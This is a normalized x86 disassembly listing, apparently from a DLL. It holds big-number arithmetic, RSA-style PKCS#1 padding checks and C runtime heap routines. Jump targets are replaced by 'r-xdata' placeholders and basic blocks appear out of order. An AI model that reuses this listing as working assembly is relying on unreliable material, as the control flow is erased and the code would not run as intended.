mov [ esi ] eax
lea eax [ ebp - 0xa0 ]
push eax
push ebx
lea eax [ ebp - 0x124 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1a8 ]
push eax
call sub_1000fd4a
push edi
lea eax [ ebp - 0x1a8 ]
push eax
push [ esi ]
push [ ebp + 0x70 ]
call sub_1000f6a5
mov esi 0x84
push esi
lea eax [ ebp - 0x1a8 ]
push 0x0
push eax
call sub_1000d091
push esi
lea eax [ ebp - 0x1c ]
push 0x0
push eax
call sub_1000d091
add esp 0x40
xor eax eax
mov eax 0x401
jmp r-xdata
pop edi
pop esi
pop ebx
add ebp 0x68
leave
retn
sub_1000f105
push ebp
lea ebp [ esp - 0x68 ]
sub esp 0x634
push ebx
push esi
push edi
push [ ebp + 0x7c ]
mov esi eax
push [ ebp + 0x78 ]
lea eax [ ebp - 0x1ac ]
push 0x21
pop edi
push edi
push eax
call sub_1000f651
push 0x40
pop ebx
push ebx
lea eax [ esi + 0x182 ]
push eax
lea eax [ ebp - 0x128 ]
push edi
push eax
call sub_1000f651
push ebx
lea eax [ esi + 0x1c2 ]
push eax
lea eax [ ebp - 0x2b4 ]
push edi
push eax
call sub_1000f651
push ebx
lea eax [ esi + 0x202 ]
push eax
lea eax [ ebp - 0x3bc ]
push edi
push eax
call sub_1000f651
add esp 0x40
push ebx
lea eax [ esi + 0x242 ]
push eax
lea eax [ ebp - 0x4c4 ]
push edi
push eax
call sub_1000f651
push 0x80
lea eax [ esi + 0x2 ]
push eax
lea eax [ ebp - 0x548 ]
push edi
push eax
call sub_1000f651
push ebx
lea eax [ esi + 0x282 ]
push eax
lea eax [ ebp - 0x5cc ]
push edi
push eax
call sub_1000f651
lea eax [ ebp - 0x1ac ]
push edi
push eax
call sub_1000f859
mov [ ebp + 0x64 ] eax
lea eax [ ebp - 0x128 ]
push edi
push eax
call sub_1000f859
add esp 0x40
mov ebx eax
lea eax [ ebp - 0x548 ]
push edi
push eax
call sub_1000f859
mov edi eax
push edi
lea eax [ ebp - 0x548 ]
push eax
lea eax [ ebp - 0x1ac ]
push eax
call sub_1000f800
add esp 0x14
test eax eax
jl r-xdata
movzx eax [ esi ]
add eax 0x7
push 0x8
pop ecx
cdq
idiv ecx
mov esi [ ebp + 0x74 ]
push ebx
mov [ esi ] eax
lea eax [ ebp - 0x128 ]
push eax
push [ ebp + 0x64 ]
lea eax [ ebp - 0x1ac ]
push eax
lea eax [ ebp - 0x440 ]
push eax
call sub_1000fce4
push ebx
lea eax [ ebp - 0x2b4 ]
push eax
push [ ebp + 0x64 ]
lea eax [ ebp - 0x1ac ]
push eax
lea eax [ ebp - 0x338 ]
push eax
call sub_1000fce4
lea eax [ ebp - 0x230 ]
push edi
push eax
call sub_1000f6f2
push ebx
lea eax [ ebp - 0x128 ]
push eax
push ebx
lea eax [ ebp - 0x3bc ]
push eax
lea eax [ ebp - 0x440 ]
push eax
lea eax [ ebp - 0x230 ]
push eax
call sub_1000fd4a
add esp 0x48
lea eax [ ebp - 0xa4 ]
push edi
push eax
call sub_1000f6f2
push ebx
lea eax [ ebp - 0x2b4 ]
push eax
push ebx
lea eax [ ebp - 0x4c4 ]
push eax
lea eax [ ebp - 0x338 ]
push eax
lea eax [ ebp - 0xa4 ]
push eax
call sub_1000fd4a
push ebx
lea eax [ ebp - 0xa4 ]
push eax
lea eax [ ebp - 0x230 ]
push eax
call sub_1000f800
add esp 0x2c
test eax eax
push ebx
jl r-xdata
mov eax 0x401
jmp r-xdata
lea eax [ ebp - 0x230 ]
push eax
lea eax [ ebp - 0xa4 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_1000f70a
push ebx
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x128 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_1000f70a
add esp 0x20
lea eax [ ebp - 0xa4 ]
push eax
lea eax [ ebp - 0x230 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_1000f70a
add esp 0x10
jmp r-xdata
pop edi
pop esi
pop ebx
add ebp 0x68
leave
retn
push ebx
lea eax [ ebp - 0x128 ]
push eax
lea eax [ ebp - 0x5cc ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push eax
call sub_1000fd0d
push ebx
lea eax [ ebp - 0x2b4 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push eax
call sub_1000f91b
push edi
lea eax [ ebp - 0xa4 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push eax
call sub_1000f878
push edi
lea eax [ ebp - 0x20 ]
push eax
push [ esi ]
push [ ebp + 0x70 ]
call sub_1000f6a5
add esp 0x44
mov esi 0x84
push esi
xor edi edi
lea eax [ ebp - 0x1ac ]
push edi
push eax
call sub_1000d091
push esi
lea eax [ ebp - 0x440 ]
push edi
push eax
call sub_1000d091
push esi
lea eax [ ebp - 0x338 ]
push edi
push eax
call sub_1000d091
push esi
lea eax [ ebp - 0x3bc ]
push edi
push eax
call sub_1000d091
push esi
lea eax [ ebp - 0x4c4 ]
push edi
push eax
call sub_1000d091
push esi
lea eax [ ebp - 0x230 ]
push edi
push eax
call sub_1000d091
add esp 0x48
push esi
lea eax [ ebp - 0xa4 ]
push edi
push eax
call sub_1000d091
push esi
lea eax [ ebp - 0x128 ]
push edi
push eax
call sub_1000d091
push esi
lea eax [ ebp - 0x2b4 ]
push edi
push eax
call sub_1000d091
push esi
push edi
lea eax [ ebp - 0x5cc ]
push eax
call sub_1000d091
push esi
lea eax [ ebp - 0x20 ]
push edi
push eax
call sub_1000d091
add esp 0x3c
xor eax eax
sub_1000f41a
push ebp
lea ebp [ esp - 0x60 ]
sub esp 0x88
mov eax [ ebp + 0x78 ]
movzx eax [ eax ]
push edi
add eax 0x7
push 0x8
cdq
pop ecx
idiv ecx
mov edi [ ebp + 0x74 ]
lea ecx [ edi + 0xb ]
cmp ecx eax
mov [ ebp + 0x58 ] eax
jbe r-xdata
push ebx
push [ ebp + 0x7c ]
lea eax [ ebp + 0x5c ]
push eax
call sub_1000d85c
xor ebx ebx
cmp [ ebp + 0x5c ] ebx
pop ecx
pop ecx
je r-xdata
mov eax 0x406
jmp r-xdata
push esi
mov esi [ ebp + 0x58 ]
sub esi edi
push 0x2
pop eax
dec esi
cmp esi eax
mov [ ebp - 0x28 ] bl
mov [ ebp - 0x27 ] al
mov [ ebp + 0x5c ] eax
jbe r-xdata
mov eax 0x408
jmp r-xdata
pop edi
add ebp 0x60
leave
retn
mov [ ebp + eax - 0x28 ] bl
inc eax
push edi
push [ ebp + 0x70 ]
mov [ ebp + 0x5c ] eax
lea eax [ ebp + eax - 0x28 ]
push eax
call sub_1000d0aa
push [ ebp + 0x58 ]
lea eax [ ebp - 0x28 ]
push eax
push [ ebp + 0x6c ]
mov eax [ ebp + 0x78 ]
push [ ebp + 0x68 ]
call sub_1000f006
push 0x80
mov esi eax
lea eax [ ebp - 0x28 ]
push ebx
push eax
mov [ ebp + 0x77 ] bl
call sub_1000d091
add esp 0x28
mov eax esi
pop esi
push [ ebp + 0x7c ]
lea eax [ ebp + 0x77 ]
push 0x1
push eax
call sub_1000d86b
mov cl [ ebp + 0x77 ]
add esp 0xc
cmp cl bl
je r-xdata
pop ebx
mov eax [ ebp + 0x5c ]
mov [ ebp + eax - 0x28 ] cl
inc eax
cmp eax esi
mov [ ebp + 0x5c ] eax
jb r-xdata
sub_1000f4f6
push ebp
mov ebp esp
sub esp 0x80
mov ecx [ ebp + 0x18 ]
movzx eax [ ecx ]
push esi
add eax 0x7
push 0x8
cdq
pop esi
idiv esi
mov esi eax
cmp [ ebp + 0x14 ] esi
ja r-xdata
mov eax 0x406
jmp r-xdata
push [ ebp + 0x14 ]
lea eax [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
lea eax [ ebp - 0x80 ]
push eax
mov eax ecx
call sub_1000f006
add esp 0x10
test eax eax
jne r-xdata
pop esi
leave
retn
cmp [ ebp + 0x14 ] esi
je r-xdata
cmp [ ebp - 0x80 ] 0x0
jne r-xdata
mov eax 0x401
cmp [ ebp - 0x7f ] 0x1
jne r-xdata
push 0x2
pop ecx
lea eax [ esi - 0x1 ]
cmp eax ecx
jbe r-xdata
mov al [ ebp + ecx - 0x80 ]
inc ecx
test al al
jne r-xdata
cmp [ ebp + ecx - 0x80 ] 0xff
jne r-xdata
mov edx [ ebp + 0xc ]
mov eax esi
sub eax ecx
mov [ edx ] eax
lea edx [ eax + 0xb ]
cmp edx esi
ja r-xdata
inc ecx
cmp ecx eax
jb r-xdata
push eax
lea eax [ ebp + ecx - 0x80 ]
push eax
push [ ebp + 0x8 ]
call sub_1000d0aa
push 0x80
lea eax [ ebp - 0x80 ]
push 0x0
push eax
call sub_1000d091
add esp 0x18
xor eax eax
jmp r-xdata
sub_1000f5a6
push ebp
mov ebp esp
sub esp 0x80
mov ecx [ ebp + 0x18 ]
movzx eax [ ecx ]
push esi
add eax 0x7
push 0x8
cdq
pop esi
idiv esi
mov esi eax
cmp [ ebp + 0x14 ] esi
ja r-xdata
mov eax 0x406
jmp r-xdata
push [ ebp + 0x14 ]
lea eax [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
lea eax [ ebp - 0x80 ]
push eax
mov eax ecx
call sub_1000f105
add esp 0x10
test eax eax
jne r-xdata
pop esi
leave
retn
cmp [ ebp + 0x14 ] esi
je r-xdata
cmp [ ebp - 0x80 ] 0x0
jne r-xdata
mov eax 0x401
push 0x2
pop eax
cmp [ ebp - 0x7f ] al
jne r-xdata
lea ecx [ esi - 0x1 ]
cmp ecx eax
jbe r-xdata
inc eax
cmp eax esi
jae r-xdata
cmp [ ebp + eax - 0x80 ] 0x0
je r-xdata
mov edx [ ebp + 0xc ]
mov ecx esi
sub ecx eax
mov [ edx ] ecx
lea edx [ ecx + 0xb ]
cmp edx esi
ja r-xdata
inc eax
cmp eax ecx
jb r-xdata
push ecx
lea eax [ ebp + eax - 0x80 ]
push eax
push [ ebp + 0x8 ]
call sub_1000d0aa
push 0x80
lea eax [ ebp - 0x80 ]
push 0x0
push eax
call sub_1000d091
add esp 0x18
xor eax eax
jmp r-xdata
sub_1000f651
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0xc ]
xor edx edx
dec eax
test ecx ecx
jbe r-xdata
pop ebp
retn
push edi
mov edi [ ebp + 0x8 ]
push esi
cmp edx ecx
pop esi
jae r-xdata
xor esi esi
xor ecx ecx
pop edi
sub ecx edx
lea edi [ edi + edx * 4 ]
xor eax eax
[ edi ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ edi + edx * 4 ] esi
inc edx
cmp edx ecx
jb r-xdata
mov edi [ ebp + 0x10 ]
movzx edi [ eax + edi ]
shl edi cl
add ecx 0x8
or esi edi
dec eax
test eax eax
jge r-xdata
test eax eax
jl r-xdata
cmp ecx 0x20
jae r-xdata
sub_1000f6a5
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
xor edi edi
dec eax
cmp [ ebp + 0x14 ] edi
jbe r-xdata
test eax eax
jl r-xdata
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov [ eax + ecx ] 0x0
dec eax
jns r-xdata
mov ecx [ ebp + 0x10 ]
mov esi [ ecx + edi * 4 ]
xor ecx ecx
inc edi
cmp edi [ ebp + 0x14 ]
jb r-xdata
mov ebx [ ebp + 0x8 ]
mov edx esi
shr edx cl
add ecx 0x8
mov [ eax + ebx ] dl
dec eax
test eax eax
jge r-xdata
cmp ecx 0x20
jae r-xdata
sub_1000f70a
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x14 ] eax
je r-xdata
pop ebp
retn
mov edx [ ebp + 0x10 ]
push ebx
push edi
mov edi [ ebp + 0xc ]
mov eax [ edx ]
or ebx 0xffffffff
sub ecx eax
sub ebx eax
cmp ebx ecx
sbb eax eax
neg eax
or ecx ecx
sub ecx [ edx ]
jmp r-xdata
mov ecx [ edi ]
sub ecx eax
add edi 0x4
cmp ecx 0xffffffff
jne r-xdata
pop edi
pop ebx
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
add edx 0x4
dec [ ebp + 0x14 ]
mov [ ebx ] ecx
jne r-xdata
sub_1000f752
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
push 0x20
pop ebx
cmp [ ebp + 0x10 ] ebx
jae r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
leave
retn
cmp [ ebp + 0x14 ] 0x0
je r-xdata
sub ebx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
mov edx [ esi ]
mov ecx [ ebp + 0x10 ]
mov eax edx
shl eax cl
add esi 0x4
or eax [ ebp - 0x4 ]
mov [ edi ] eax
mov eax ecx
mov ecx ebx
shr edx cl
add edi 0x4
neg eax
sbb eax eax
and eax edx
dec [ ebp + 0x14 ]
mov [ ebp - 0x4 ] eax
jne r-xdata
pop edi
pop esi
sub_1000f7a4
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push edi
push 0x20
pop edi
cmp [ ebp + 0x10 ] edi
jae r-xdata
mov eax [ ebp - 0x4 ]
pop edi
leave
retn
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x14 ]
sub edi [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
lea esi [ eax + ecx * 4 ]
sub ebx eax
mov ecx [ ebp + 0x10 ]
dec [ ebp + 0x14 ]
sub esi 0x4
mov edx [ ebx + esi ]
mov eax edx
shr eax cl
or eax [ ebp - 0x4 ]
mov [ esi ] eax
mov eax ecx
mov ecx edi
shl edx cl
neg eax
sbb eax eax
and eax edx
cmp [ ebp + 0x14 ] 0x0
mov [ ebp - 0x4 ] eax
jne r-xdata
pop esi
pop ebx
sub_1000f800
push esi
push edi
mov edi [ esp + 0x14 ]
test edi edi
je r-xdata
xor eax eax
mov edx [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
lea eax [ edx + edi * 4 ]
sub ecx edx
xor eax eax
inc eax
jmp r-xdata
jb r-xdata
pop edi
pop esi
retn
or eax 0xffffffff
jmp r-xdata
test edi edi
jne r-xdata
sub eax 0x4
mov edx [ ecx + eax ]
mov esi [ eax ]
dec edi
cmp edx esi
ja r-xdata
sub_1000f859
mov eax [ esp + 0x8 ]
test eax eax
je r-xdata
xor eax eax
retn
dec eax
inc eax
retn
mov ecx eax
dec eax
test ecx ecx
jne r-xdata
mov ecx [ esp + 0x4 ]
cmp [ ecx + eax * 4 ] 0x0
jne r-xdata
sub_1000f878
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x14 ] eax
je r-xdata
pop ebp
retn
mov edx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edx ]
add ecx eax
cmp ecx eax
sbb eax eax
neg eax
mov ecx [ edx ]
jmp r-xdata
mov ecx [ ebx ]
add ecx eax
add ebx 0x4
cmp ecx eax
jae r-xdata
pop edi
pop ebx
mov [ edi ] ecx
add edx 0x4
add edi 0x4
dec [ ebp + 0x14 ]
jne r-xdata
sub_1000f8b7
push ebp
mov ebp esp
push ecx
movzx ecx [ ebp + 0x8 ]
movzx eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx ecx
imul ebx eax
push esi
mov esi [ ebp + 0xc ]
shr edx 0x10
shr esi 0x10
movzx edx dx
movzx esi si
mov [ ebp + 0xc ] edx
imul ecx esi
imul eax [ ebp + 0xc ]
mov [ edi ] ebx
mov ebx edx
mov edx [ ebp + 0x10 ]
imul ebx esi
add eax ecx
cmp eax ecx
mov [ edx ] ebx
mov esi 0x10000
jb r-xdata
mov ecx eax
shl ecx 0x10
add [ edi ] ecx
shr eax 0x10
cmp [ edi ] ecx
jae r-xdata
mov esi [ ebp - 0x4 ]
add eax esi
add [ edx ] eax
pop esi
pop ebx
leave
retn
inc esi
sub_1000f91b
push ebp
mov ebp esp
sub esp 0x128
mov edx [ ebp + 0x14 ]
push ebx
lea eax [ edx + edx ]
push edi
push eax
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x128 ]
push eax
call sub_1000f6f2
mov ebx [ ebp + 0xc ]
push edx
push ebx
call sub_1000f859
push edx
push [ ebp + 0x10 ]
mov edi eax
call sub_1000f859
add esp 0x18
test edi edi
mov [ ebp - 0x8 ] eax
jbe r-xdata
push [ ebp - 0x1c ]
lea eax [ ebp - 0x128 ]
push eax
push [ ebp + 0x8 ]
call sub_1000f839
add esp 0xc
pop edi
pop ebx
leave
retn
push esi
lea esi [ ebp - 0x128 ]
lea eax [ ebp + eax * 4 - 0x128 ]
sub esi ebx
mov [ ebp + 0x14 ] ebx
mov [ ebp - 0xc ] eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x10 ] edi
add [ eax ] ebx
add [ ebp + 0x14 ] 0x4
add eax 0x4
dec [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
jne r-xdata
cmp [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ebx
jbe r-xdata
mov ecx [ ebp + 0x14 ]
xor ebx ebx
cmp [ ecx ] ebx
je r-xdata
pop esi
mov eax ecx
add esi eax
add ebx [ ebp - 0x20 ]
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
add esi 0x4
cmp eax [ ebp - 0x8 ]
jb r-xdata
inc ebx
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0x10 ]
push [ eax + ecx * 4 ]
mov eax [ ebp + 0x14 ]
push [ eax ]
lea edi [ ebp - 0x14 ]
call sub_1000f8b7
add [ esi ] ebx
mov eax [ ebp - 0x14 ]
add esp 0xc
cmp [ esi ] ebx
sbb ebx ebx
add [ esi ] eax
neg ebx
cmp [ esi ] eax
jae r-xdata
mov eax [ ebp - 0xc ]
mov esi [ ebp - 0x18 ]
sub_1000fa01
push ebp
mov ebp esp
sub esp 0x18
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x0
push esi
mov esi [ ebp + 0x8 ]
je r-xdata
mov eax [ ebp - 0x4 ]
pop esi
leave
retn
test ecx ecx
jbe r-xdata
sub eax edx
push ebx
mov [ ebp - 0x8 ] edx
sub [ ebp - 0x8 ] esi
push edi
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov ecx [ ebp - 0x8 ]
lea ebx [ ecx + esi ]
lea ecx [ ebp - 0x18 ]
push ecx
push [ ebx + eax ]
lea edi [ ebp - 0x14 ]
push [ ebp + 0xc ]
call sub_1000f8b7
mov ebx [ ebx ]
sub ebx [ ebp - 0x4 ]
or eax 0xffffffff
sub eax [ ebp - 0x4 ]
add esp 0xc
cmp eax ebx
mov eax [ ebp - 0x14 ]
sbb edx edx
mov [ esi ] ebx
sub [ esi ] eax
mov ecx [ esi ]
or edi 0xffffffff
sub edi eax
neg edx
cmp ecx edi
jbe r-xdata
add edx [ ebp - 0x18 ]
add esi 0x4
dec [ ebp - 0xc ]
mov [ ebp - 0x4 ] edx
jne r-xdata
inc edx
mov eax [ ebp - 0x10 ]
pop edi
pop ebx
sub_1000fa83
push ebp
lea ebp [ esp - 0x60 ]
sub esp 0x1c0
mov edx [ ebp + 0x78 ]
push ebx
push [ ebp + 0x7c ]
push edx
call sub_1000f859
mov ebx eax
test ebx ebx
pop ecx
pop ecx
mov [ ebp + 0x34 ] ebx
je r-xdata
pop ebx
add ebp 0x60
leave
retn
mov eax [ edx + ebx * 4 - 0x4 ]
push esi
push edi
push 0x20
xor ecx ecx
pop edi
lea eax [ ebp - 0x160 ]
push ebx
sub edi ecx
push eax
mov [ ebp + 0x38 ] edi
call sub_1000f6f2
mov esi [ ebp + 0x74 ]
push esi
push edi
push [ ebp + 0x70 ]
lea eax [ ebp - 0x160 ]
push eax
call sub_1000f752
push ebx
push edi
push [ ebp + 0x78 ]
mov [ ebp + esi * 4 - 0x160 ] eax
lea eax [ ebp - 0x54 ]
push eax
call sub_1000f752
mov eax [ ebp + ebx * 4 - 0x58 ]
mov ecx [ ebp + 0x68 ]
push esi
push ecx
mov [ ebp + 0x5c ] eax
call sub_1000f6f2
add esp 0x30
sub esi ebx
js r-xdata
inc ecx
shr eax 0x1
cmp ecx edi
jb r-xdata
push [ ebp + 0x7c ]
push [ ebp + 0x6c ]
call sub_1000f6f2
push ebx
push edi
lea eax [ ebp - 0x160 ]
push eax
push [ ebp + 0x6c ]
call sub_1000f7a4
add esp 0x18
pop edi
pop esi
lea eax [ ebp + esi * 4 - 0x160 ]
mov [ ebp + 0x50 ] eax
lea edi [ esi + ebx ]
mov [ ebp + 0x48 ] ecx
lea eax [ ebp - 0x160 ]
sub [ ebp + 0x48 ] eax
lea edi [ ebp + edi * 4 - 0x160 ]
inc esi
mov [ ebp + 0x40 ] edi
mov [ ebp + 0x44 ] esi
test eax eax
je r-xdata
inc [ ebp + 0x5c ]
mov ecx [ ebp + 0x5c ]
mov ebx [ edi - 0x4 ]
mov edi [ edi ]
shr ecx 0x10
cmp cx 0xffff
mov [ ebp + 0x3c ] ecx
mov [ ebp + 0x58 ] edi
mov eax edi
jne r-xdata
mov esi [ edi ]
jmp r-xdata
movzx ecx cx
inc ecx
xor edx edx
div ecx
mov [ ebp + 0x4c ] eax
shr eax 0x10
mov [ ebp + 0x4c ] eax
jmp r-xdata
mov edx [ ebp + 0x50 ]
push esi
push edx
mov ecx ebx
lea eax [ ebp - 0x54 ]
call sub_1000fa01
pop ecx
pop ecx
shr ecx 0x10
add ecx [ ebp + 0x30 ]
sub [ ebp + 0x58 ] ecx
dec [ ebp + 0x58 ]
movzx esi [ ebp + 0x5c ]
movzx edi [ ebp + 0x3c ]
movzx eax ax
mov ecx esi
imul ecx eax
imul eax edi
mov [ ebp + 0x30 ] eax
mov eax ecx
shl eax 0x10
or edx 0xffffffff
sub ebx eax
sub edx eax
cmp ebx edx
jbe r-xdata
push ebx
lea eax [ ebp - 0x54 ]
push eax
push [ ebp + 0x50 ]
inc esi
push [ ebp + 0x50 ]
call sub_1000f70a
add esp 0x10
jmp r-xdata
push ebx
lea eax [ ebp - 0x54 ]
push eax
push [ ebp + 0x50 ]
call sub_1000f800
add esp 0xc
test eax eax
jl r-xdata
mov eax esi
shl eax 0x10
or ecx 0xffffffff
sub ebx eax
sub ecx eax
cmp ebx ecx
jbe r-xdata
jne r-xdata
sub [ edi ] eax
cmp [ edi ] 0x0
jne r-xdata
mov ecx [ ebp + 0x50 ]
mov eax [ ebp + 0x48 ]
sub [ ebp + 0x50 ] 0x4
sub edi 0x4
dec [ ebp + 0x44 ]
mov [ eax + ecx ] esi
mov [ ebp + 0x40 ] edi
jne r-xdata
sub [ ebp + 0x58 ] edi
inc [ ebp + 0x4c ]
jmp r-xdata
dec [ ebp + 0x58 ]
cmp [ ebp + 0x3c ] 0xffff
jne r-xdata
mov eax esi
shl eax 0x10
cmp ebx eax
jb r-xdata
cmp [ ebp + 0x5c ] 0xffffffff
jne r-xdata
mov edi [ ebp + 0x38 ]
cmp [ ebp + 0x58 ] edi
ja r-xdata
mov ecx [ ebp + 0x58 ]
mov eax ebx
shl ecx 0x10
shr eax 0x10
add eax ecx
lea ecx [ edi + 0x1 ]
xor edx edx
div ecx
mov eax [ ebp + 0x58 ]
jmp r-xdata
mov edx ecx
shl edx 0x10
or esi 0xffffffff
sub ebx edx
sub esi edx
cmp ebx esi
jbe r-xdata
dec [ ebp + 0x58 ]
movzx ecx ax
imul esi ecx
imul ecx edi
or edx 0xffffffff
sub ebx esi
sub edx esi
cmp ebx edx
jbe r-xdata
mov edx [ ebp + 0x58 ]
shr ecx 0x10
sub edx ecx
dec [ ebp + 0x58 ]
sub ebx [ ebp + 0x5c ]
or ecx 0xffffffff
sub ecx [ ebp + 0x5c ]
cmp ebx ecx
jbe r-xdata
jne r-xdata
inc eax
jmp r-xdata
dec edx
movzx esi [ ebp + 0x4c ]
mov ebx [ ebp + 0x34 ]
mov edi [ ebp + 0x40 ]
movzx eax ax
shl esi 0x10
add esi eax
dec [ ebp + 0x5c ]
cmp ebx [ ebp + 0x5c ]
jb r-xdata
test edx edx
ja r-xdata
sub_1000fce4
push ebp
mov ebp esp
sub esp 0x108
push [ ebp + 0x18 ]
lea eax [ ebp - 0x108 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_1000fa83
add esp 0x18
leave
retn
sub_1000fd0d
push ebp
mov ebp esp
sub esp 0x108
push esi
mov esi [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
lea eax [ ebp - 0x108 ]
push [ ebp + 0xc ]
push eax
call sub_1000f91b
push esi
push [ ebp + 0x14 ]
lea eax [ esi + esi ]
push eax
lea eax [ ebp - 0x108 ]
push eax
push [ ebp + 0x8 ]
call sub_1000fce4
add esp 0x24
pop esi
leave
retn
sub_1000fd4a
push ebp
lea ebp [ esp - 0x60 ]
sub esp 0x214
push ebx
push esi
mov esi [ ebp + 0x7c ]
push esi
push [ ebp + 0x6c ]
lea eax [ ebp - 0x1b4 ]
push eax
call sub_1000f839
push esi
push [ ebp + 0x78 ]
lea eax [ ebp - 0x1b4 ]
push [ ebp + 0x6c ]
push eax
lea eax [ ebp - 0x130 ]
push eax
call sub_1000fd0d
push esi
push [ ebp + 0x78 ]
lea eax [ ebp - 0x130 ]
push [ ebp + 0x6c ]
push eax
lea eax [ ebp - 0xac ]
push eax
call sub_1000fd0d
lea eax [ ebp - 0x28 ]
push esi
push eax
call sub_1000f6f2
push [ ebp + 0x74 ]
mov [ ebp - 0x28 ] 0x1
push [ ebp + 0x70 ]
call sub_1000f859
add esp 0x44
dec eax
mov [ ebp + 0x5c ] eax
mov ebx eax
js r-xdata
push esi
lea eax [ ebp - 0x28 ]
push eax
push [ ebp + 0x68 ]
call sub_1000f839
add esp 0xc
pop esi
pop ebx
add ebp 0x60
leave
retn
push edi
lea eax [ ecx - 0x1 ]
shr eax 0x1
inc eax
mov [ ebp + 0x74 ] eax
mov eax 0xc0000000
test eax edi
jne r-xdata
shl edi 0x2
dec [ ebp + 0x74 ]
jne r-xdata
imul eax eax 0x84
push esi
push [ ebp + 0x78 ]
lea eax [ ebp + eax - 0x238 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
push eax
call sub_1000fd0d
add esp 0x14
shl edi 0x2
dec ecx
dec ecx
test eax edi
je r-xdata
push esi
push [ ebp + 0x78 ]
lea eax [ ebp - 0x28 ]
push eax
push eax
push eax
call sub_1000fd0d
push esi
push [ ebp + 0x78 ]
lea eax [ ebp - 0x28 ]
push eax
push eax
push eax
call sub_1000fd0d
mov eax edi
add esp 0x28
shr eax 0x1e
je r-xdata
dec ebx
jns r-xdata
test ecx ecx
jbe r-xdata
cmp ebx [ ebp + 0x5c ]
mov eax [ ebp + 0x70 ]
mov edi [ eax + ebx * 4 ]
push 0x20
pop ecx
jne r-xdata
pop edi
sub_1000fe7d
push 0xc
push r--data
call sub_10012000
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_10012045
retn
cmp [ rw-data ] 0x3
jne r-xdata
push esi
push 0x4
call sub_10011508
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_1001153b
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
call sub_1001129f
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_1001125d
mov [ esi ] eax
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000fed3
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
push esi
push eax
call sub_1001156b
pop ecx
pop ecx
push [ ebp + 0x8 ]
jmp r-xdata
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
sub_1000ff0b
push 0xc
push r--data
call sub_10012000
and [ ebp - 0x1c ] 0x0
mov esi [ ebp + 0x8 ]
cmp esi [ rw-data ]
ja r-xdata
mov eax [ ebp - 0x1c ]
call sub_10012045
retn
push 0x4
call sub_10011508
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_10011d1a
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000ff51
sub_1000ff5a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xffffffe0
ja r-xdata
push esi
call sub_100126f2
pop ecx
call sub_1001129f
mov [ eax ] 0xc
xor eax eax
push ebx
push edi
mov edi [ HeapAlloc@IAT ]
mov eax [ rw-data ]
cmp eax 0x1
jne r-xdata
call sub_100126aa
push 0x1e
call sub_100124ff
push 0xff
call sub_10012270
cmp eax 0x3
jne r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
push esi
call sub_1000ff0b
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
mov eax esi
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
inc esi
mov ebx eax
test ebx ebx
jne r-xdata
push 0x0
push [ rw-data ]
call edi
push eax
jmp r-xdata
pop edi
mov eax ebx
pop ebx
jmp r-xdata
push 0xc
pop esi
cmp [ rw-data ] eax
je r-xdata
pop esi
pop ebp
retn
call sub_1001129f
mov [ eax ] esi
push [ ebp + 0x8 ]
call sub_100126f2
pop ecx
test eax eax
je r-xdata
call sub_1001129f
mov [ eax ] esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
